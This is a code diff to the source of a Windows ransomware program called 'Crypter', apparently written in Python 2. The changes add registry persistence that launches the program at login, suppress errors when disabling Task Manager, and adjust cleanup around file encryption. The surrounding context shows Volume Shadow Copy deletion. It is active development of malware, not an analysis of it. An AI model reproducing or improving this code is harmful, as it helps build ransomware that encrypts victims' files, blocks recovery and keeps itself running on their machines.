@@ -15,7 +15,6 @@ import _winreg
 import wx
 import time
 import json
-import traceback
 
 # Import classes
 import Crypt
@@ -51,7 +50,15 @@ class Crypter(Base.Base):
       # Disable Task Manager
       if self.__config["disable_task_manager"]:
           self.task_manager = TaskManager()      
-          self.task_manager.disable()
+          try:
+            self.task_manager.disable()
+          except WindowsError:
+            pass
+          
+      # Add to startup programs
+      # TODO Test
+      if self.__config["open_gui_on_login"]:
+          self.__add_to_startup_programs()
       
       # Find files and initialise keys
       self.Crypt.init_keys()
@@ -60,8 +67,10 @@ class Crypter(Base.Base):
       # Start encryption
       self.encrypt_files(file_list)
 
-      # If no files were encrypted. do nothing 
-      if not os.path.isfile(self.encrypted_file_list):
+      # If no files were encrypted. cleanup and return
+      if self.__no_files_were_encrypted():
+          # TODO Test
+          self.cleanup()
           return
 
       # Delete Shadow Copies
@@ -100,6 +109,48 @@ class Crypter(Base.Base):
           )
       vs_deleter.run_now()
       vs_deleter.cleanup()
+      
+      
+  def __no_files_were_encrypted(self):
+      '''
+      @summary: Checks if any files were encrypted
+      @return: True if no files were encrypted, otherwise False
+      @todo: Test
+      '''
+      
+      if not os.path.isfile(self.encrypted_file_list):
+          return True
+      else:
+          return False
+      
+      
+  def __add_to_startup_programs(self):
+      '''
+      @summary: Adds Crypter to the list of Windows startup programs
+      @todo: Code and test
+      @todo: Restore try and except catch
+      '''
+
+      try:
+          reg = _winreg.CreateKeyEx(_winreg.HKEY_CURRENT_USER, self.STARTUP_REGISTRY_LOCATION)
+          _winreg.SetValueEx(reg, "Crypter", 0, _winreg.REG_SZ, sys.executable)
+          _winreg.CloseKey(reg)
+      except WindowsError:
+          pass
+  
+  
+  def __remove_from_startup_programs(self):
+      '''
+      @summary: Removes Crypter from the list of startup programs
+      @todo: Code and test
+      '''
+
+      try:
+          reg = _winreg.OpenKeyEx(_winreg.HKEY_CURRENT_USER, self.STARTUP_REGISTRY_LOCATION, 0, _winreg.KEY_SET_VALUE)
+          _winreg.DeleteValue(reg, "Crypter")
+          _winreg.CloseKey(reg)
+      except WindowsError:
+          pass
 
       
   def get_start_time(self):
@@ -129,12 +180,19 @@ class Crypter(Base.Base):
     @summary: Cleanups the system following successful decryption. Removed the list of
     encrypted files and deletes the Crypter registry key. Re-enable TM
     '''
+      
+    # If files were encrypted, Remove from startup programs (if present in list)
+    if not self.__no_files_were_encrypted() and self.__config["open_gui_on_login"]:
+        self.__remove_from_startup_programs()
     
     self.delete_encrypted_file_list()
     self.delete_registry_entries()
     
     if self.__config["disable_task_manager"]:
-        self.task_manager.enable()
+        try:
+            self.task_manager.enable()
+        except WindowsError:
+            pass
 
 
 
@@ -144,9 +202,13 @@ class Crypter(Base.Base):
     '''
     
     # Open and delete the key
-    reg = _winreg.OpenKeyEx(_winreg.HKEY_CURRENT_USER, self.REGISTRY_LOCATION)
-    _winreg.DeleteKeyEx(reg, "")
-    _winreg.CloseKey(reg)
+    try:
+        reg = _winreg.OpenKeyEx(_winreg.HKEY_CURRENT_USER, self.REGISTRY_LOCATION)
+        _winreg.DeleteKeyEx(reg, "")
+        _winreg.CloseKey(reg)
+    except WindowsError:
+        # Ignore any Windows errors
+        pass
     
       
   def start_gui(self):
@@ -210,7 +272,8 @@ class Crypter(Base.Base):
     '''
 
     # Remove encrypted file list
-    os.remove(self.encrypted_file_list)
+    if os.path.isfile(self.encrypted_file_list):
+        os.remove(self.encrypted_file_list)
 
 
   def encrypt_files(self, file_list):
@@ -291,7 +354,6 @@ class Crypter(Base.Base):
       @summary: Checks whether the specified path should be excluded from encryption
       @param path: The path to check
       @return: True if the path should be excluded from encryption, otherwise False
-      @todo: Test
       '''
       
       for dir_to_exclude in self.DIRS_TO_EXCLUDE:
@@ -306,7 +368,6 @@ class Crypter(Base.Base):
       @summary: Checks whether the specified file is marked as a file to be excluded from encryption
       @param file: The file to check
       @requires: True if the file should be excluded from encryption, otherwise false
-      @todo: Test
       '''
       
       if file.lower() in self.FILES_TO_EXCLUDE:
